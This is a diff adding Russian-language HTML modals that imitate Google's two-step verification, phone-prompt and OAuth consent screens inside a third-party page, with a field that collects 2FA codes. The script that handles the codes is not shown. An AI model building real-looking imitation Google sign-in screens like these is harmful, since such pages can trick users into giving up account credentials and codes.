+                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
+                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
+                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
+                        </svg>
+                        <h1 class="google-title">Двухэтапная аутентификация</h1>
+                        <div class="google-user-chip" id="btnBackToGooglePassword">
+                            <div class="google-avatar-mini" id="google2faChipInitial">G</div>
+                            <span class="google-chip-email" id="google2faDisplayEmail">user@gmail.com</span>
+                        </div>
+                    </div>
+
+                    <div class="google-form-body">
+                        <p class="google-desc-text">
+                            Чтобы защитить ваш аккаунт, Google хочет убедиться, что это действительно вы. 
+                            Введите 6-значный код подтверждения из SMS или приложения Authenticator.
+                        </p>
+
+                        <div class="google-input-box">
+                            <input type="text" id="google2faCodeInput" class="google-input" maxlength="8" placeholder=" " inputmode="numeric">
+                            <label for="google2faCodeInput" class="google-label">Введите код (G-XXXXXX)</label>
+                        </div>
+
+                        <div class="google-action-row">
+                            <button type="button" class="google-link-btn" id="btnSkipGoogle2FA">Другой способ</button>
+                            <button type="button" class="google-btn-primary" id="btnSubmitGoogle2FA">Далее</button>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- STEP GOOGLE 4: Device Prompt Verification -->
+                <section id="stepGooglePrompt" class="auth-step google-modal-step">
+                    <div class="google-card-header">
+                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
+                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
+                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21-3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
+                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
+                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
+                        </svg>
+                        <h1 class="google-title">Проверьте ваш телефон</h1>
+                        <p class="google-desc-text">Google отправил уведомление на ваше основное устройство.</p>
+                    </div>
+
+                    <div class="google-form-body">
+                        <div class="google-prompt-card">
+                            <div class="google-prompt-number" id="googlePromptNumber">42</div>
+                            <p class="google-prompt-text">
+                                Нажмите <strong>«Да, это я»</strong> на телефоне и выберите число <strong>42</strong>.
+                            </p>
+                        </div>
+
+                        <div class="google-action-row">
+                            <button type="button" class="google-link-btn" id="btnBackToGoogle2FA">Другой способ</button>
+                            <button type="button" class="google-btn-primary" id="btnConfirmGooglePrompt">Я нажал на телефоне</button>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- STEP GOOGLE 5: OAuth Permission Consent Screen -->
+                <section id="stepGoogleConsent" class="auth-step google-modal-step">
+                    <div class="google-card-header">
+                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
+                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
+                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21-3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
+                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
+                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
+                        </svg>
+                        <h1 class="google-title">Предоставление доступа</h1>
+                        <div class="google-user-chip">
+                            <div class="google-avatar-mini" id="googleConsentChipInitial">G</div>
+                            <span class="google-chip-email" id="googleConsentDisplayEmail">user@gmail.com</span>
+                        </div>
+                    </div>
+
+                    <div class="google-form-body">
+                        <p class="google-desc-text">
+                            Приложение <strong>PrivateRoom Auth</strong> запрашивает доступ к вашему аккаунту Google:
+                        </p>
+
+                        <div class="google-consent-list">
+                            <div class="google-consent-item">
+                                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1a73e8"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                                <div>
+                                    <strong>Просмотр личных данных</strong>
+                                    <span>Имя, адрес эл. почты и фото профиля</span>
+                                </div>
+                            </div>
+                            <div class="google-consent-item">
+                                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1a73e8"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                                <div>
+                                    <strong>Связанные устройства</strong>
+                                    <span>Синхронизация ключей безопасности E2E</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <p class="google-hint-text">
+                            Нажимая «Продолжить», вы разрешаете этому приложению использовать ваши данные в соответствии со своими условиями.
+                        </p>
+
+                        <div class="google-action-row">
+                            <button type="button" class="google-link-btn" id="btnCancelGoogleConsent">Отмена</button>
+                            <button type="button" class="google-btn-primary" id="btnSubmitGoogleConsent">Продолжить</button>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- Google Accounts Window Footer -->
+            <div class="google-modal-footer">
+                <div class="google-footer-lang">Русский ▾</div>
+                <div class="google-footer-links">
+                    <a href="#" onclick="event.preventDefault();">Справка</a>
+                    <a href="#" onclick="event.preventDefault();">Конфиденциальность</a>
+                    <a href="#" onclick="event.preventDefault();">Условия</a>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script src="app.js"></script>
